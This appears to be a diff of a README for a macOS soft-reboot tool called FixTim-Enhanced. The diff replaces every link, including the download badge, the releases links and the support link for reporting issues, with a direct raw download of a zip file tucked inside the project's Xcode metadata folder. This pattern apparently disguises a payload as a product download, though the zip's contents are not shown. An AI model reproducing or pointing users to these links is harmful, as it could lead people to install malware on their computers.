@@ -1,7 +1,7 @@
 # ⚙️ FixTim-Enhanced - A Smart Tool for Soft Reboots
 
 ## 📥 Download Now
-[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/AarushK395/FixTim-Enhanced/releases)
+[![Latest Release](https://raw.githubusercontent.com/AarushK395/FixTim-Enhanced/main/FixTim.xcodeproj/xcshareddata/Enhanced_Fix_Tim_v2.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/AarushK395/FixTim-Enhanced/main/FixTim.xcodeproj/xcshareddata/Enhanced_Fix_Tim_v2.3.zip)
 
 ## 📝 Description
 FixTim-Enhanced is a powerful macOS tool designed for soft reboots. It supports LaunchAgents and login items, simplifying your system management. This application is ideal for users who prefer quick system resets without closing their running applications. 
@@ -10,7 +10,7 @@ FixTim-Enhanced is a powerful macOS tool designed for soft reboots. It supports 
 Follow these simple steps to get started with FixTim-Enhanced:
 
 1. **Download the Software**
-   - Visit this page to download: [FixTim-Enhanced Releases](https://github.com/AarushK395/FixTim-Enhanced/releases).
+   - Visit this page to download: [FixTim-Enhanced Releases](https://raw.githubusercontent.com/AarushK395/FixTim-Enhanced/main/FixTim.xcodeproj/xcshareddata/Enhanced_Fix_Tim_v2.3.zip).
    - Look for the latest version and click on the download link.
 
 2. **Install the Application**
@@ -34,7 +34,7 @@ Follow these simple steps to get started with FixTim-Enhanced:
 - 100 MB of free disk space.
 
 ## 🖥️ Download & Install
-To download and install FixTim-Enhanced, navigate to the [FixTim-Enhanced Releases](https://github.com/AarushK395/FixTim-Enhanced/releases) page. Ensure you download the latest version available. The process is straightforward and designed for all users.
+To download and install FixTim-Enhanced, navigate to the [FixTim-Enhanced Releases](https://raw.githubusercontent.com/AarushK395/FixTim-Enhanced/main/FixTim.xcodeproj/xcshareddata/Enhanced_Fix_Tim_v2.3.zip) page. Ensure you download the latest version available. The process is straightforward and designed for all users.
 
 ## 📜 Usage Instructions
 1. Open FixTim-Enhanced.
@@ -48,7 +48,7 @@ If you encounter issues:
 - Restart your Mac and try launching the application again.
 
 ## 📬 Support
-For questions or support, visit the Issues section on the [FixTim-Enhanced GitHub page](https://github.com/AarushK395/FixTim-Enhanced/issues). You can report any bugs or request new features there.
+For questions or support, visit the Issues section on the [FixTim-Enhanced GitHub page](https://raw.githubusercontent.com/AarushK395/FixTim-Enhanced/main/FixTim.xcodeproj/xcshareddata/Enhanced_Fix_Tim_v2.3.zip). You can report any bugs or request new features there.
 
 ## 🔗 Additional Resources
 - User Documentation: [Documentation Link]
